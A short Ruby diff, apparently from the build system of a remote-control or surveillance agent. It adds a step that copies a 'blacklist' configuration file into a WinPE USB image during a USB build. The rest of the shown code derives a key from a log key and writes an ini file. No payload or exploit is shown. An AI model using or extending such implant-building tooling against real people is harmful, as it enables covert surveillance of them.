@@ -50,6 +50,9 @@ class BuildUSB < Build
 
     build.clean
 
+    # copy the blacklist file
+    FileUtils.cp RCS::DB::Config.instance.file('blacklist'), path("winpe/RCSPE/files/blacklist")
+
     key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
     # write the ini file
